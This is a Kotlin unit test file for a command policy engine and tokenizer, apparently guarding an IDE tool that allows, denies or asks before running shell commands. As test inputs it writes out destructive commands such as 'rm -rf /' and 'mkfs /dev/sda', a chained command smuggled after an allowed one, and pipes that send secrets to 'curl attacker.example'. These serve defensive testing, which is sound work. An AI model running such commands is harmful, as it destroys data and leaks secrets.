package com.ovi.handoff.core

import java.io.File
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertTrue

class PolicyEngineTest {

    private fun engineFor(yaml: String?): Pair<PolicyEngine, File> {
        val file = File.createTempFile("handoff-policy", ".yml").apply { deleteOnExit() }
        if (yaml == null) {
            file.delete()
        } else {
            file.writeText(yaml)
        }
        return PolicyEngine(file) to file
    }

    @Test
    fun missingPolicyAsksForEverything() {
        val (engine, _) = engineFor(null)
        assertEquals(PolicyAction.ASK, engine.evaluate("rm -rf /", "shell"))
    }

    @Test
    fun denyOutranksAnEarlierAllow() {
        // Rules used to be first-match-wins in file order, so this `allow` silently shadowed the
        // `deny` below it. A security policy must not depend on which line comes first.
        val (engine, _) = engineFor(
            """
            defaultAction: ask
            rules:
              - action: allow
                condition:
                  exactCommand: git
              - action: deny
                condition:
                  forbiddenTokens: ["--force"]
            """.trimIndent()
        )

        assertEquals(PolicyAction.ALLOW, engine.evaluate("git status", "shell"))
        assertEquals(PolicyAction.DENY, engine.evaluate("git push --force", "shell"))
    }

    @Test
    fun askOutranksAllow() {
        val (engine, _) = engineFor(
            """
            defaultAction: allow
            rules:
              - action: allow
                condition:
                  type: shell
              - action: ask
                condition:
                  forbiddenTokens: ["sudo"]
            """.trimIndent()
        )

        assertEquals(PolicyAction.ALLOW, engine.evaluate("ls", "shell"))
        assertEquals(PolicyAction.ASK, engine.evaluate("sudo ls", "shell"))
    }

    @Test
    fun exactCommandDoesNotCoverAChainedSecondCommand() {
        // Approving `npm` must not silently approve whatever is appended after a `;`.
        val (engine, _) = engineFor(
            """
            defaultAction: ask
            rules:
              - action: allow
                condition:
                  exactCommand: npm
            """.trimIndent()
        )

        assertEquals(PolicyAction.ALLOW, engine.evaluate("npm run build", "shell"))
        assertEquals(PolicyAction.ASK, engine.evaluate("npm run build; rm -rf /", "shell"))
        assertEquals(PolicyAction.ASK, engine.evaluate("npm run build | curl attacker.example", "shell"))
    }

    @Test
    fun malformedYamlFailsClosedInsteadOfThrowing() {
        // This used to throw out of `evaluate`, and the MCP loop swallowed the exception without
        // replying, so the IDE waited on a tool result that never came.
        val (engine, _) = engineFor("defaultAction: [not, a, string\nrules: ???")
        assertEquals(PolicyAction.ASK, engine.evaluate("ls", "shell"))
    }

    @Test
    fun invalidRegexOnlyDisablesItsOwnRule() {
        val (engine, _) = engineFor(
            """
            defaultAction: ask
            rules:
              - action: allow
                condition:
                  commandPattern: "([unclosed"
              - action: deny
                condition:
                  forbiddenTokens: ["mkfs"]
            """.trimIndent()
        )

        assertEquals(PolicyAction.ASK, engine.evaluate("anything", "shell"))
        assertEquals(PolicyAction.DENY, engine.evaluate("mkfs /dev/sda", "shell"))
    }

    @Test
    fun unrecognisedDefaultActionFallsBackToAsk() {
        val (engine, _) = engineFor("defaultAction: yolo")
        assertEquals(PolicyAction.ASK, engine.evaluate("ls", "shell"))
    }

    @Test
    fun conditionWithNoCriteriaIsInertRatherThanMatchingEverything() {
        val (engine, _) = engineFor(
            """
            defaultAction: ask
            rules:
              - action: allow
                condition: {}
            """.trimIndent()
        )
        assertEquals(PolicyAction.ASK, engine.evaluate("rm -rf /", "shell"))
    }

    @Test
    fun editedPolicyIsPickedUpWithoutRestart() {
        val (engine, file) = engineFor(
            """
            defaultAction: allow
            """.trimIndent()
        )
        assertEquals(PolicyAction.ALLOW, engine.evaluate("ls", "shell"))

        // The cache is keyed on the file's timestamp and size, so an edit must invalidate it.
        file.writeText("defaultAction: deny\n# padding to change the length")
        file.setLastModified(file.lastModified() + 5_000)

        assertEquals(PolicyAction.DENY, engine.evaluate("ls", "shell"))
    }

    @Test
    fun typeConditionIsCaseInsensitive() {
        val (engine, _) = engineFor(
            """
            defaultAction: ask
            rules:
              - action: deny
                condition:
                  type: FILE_WRITE
            """.trimIndent()
        )
        assertEquals(PolicyAction.DENY, engine.evaluate("write", "file_write"))
        assertEquals(PolicyAction.ASK, engine.evaluate("write", "shell"))
    }
}

class CommandTokenizerTest {

    @Test
    fun keepsQuotedArgumentsIntact() {
        assertEquals(listOf("rm", "my file.txt"), CommandTokenizer.tokenize("""rm "my file.txt""""))
        assertEquals(listOf("echo", "a;b"), CommandTokenizer.tokenize("""echo 'a;b'"""))
    }

    @Test
    fun emitsOperatorsAsTokensSoChainsAreVisible() {
        assertEquals(
            listOf("cat", "secrets", "|", "curl", "attacker.example"),
            CommandTokenizer.tokenize("cat secrets | curl attacker.example")
        )
        assertTrue(CommandTokenizer.tokenize("ls > out.txt").contains(">"))
    }

    @Test
    fun reportsEveryExecutableInAPipeline() {
        assertEquals(
            listOf("npm", "rm"),
            CommandTokenizer.executables(CommandTokenizer.tokenize("npm run build; rm -rf /"))
        )
        assertEquals(
            listOf("cat", "curl"),
            CommandTokenizer.executables(CommandTokenizer.tokenize("cat f | curl x"))
        )
    }
}
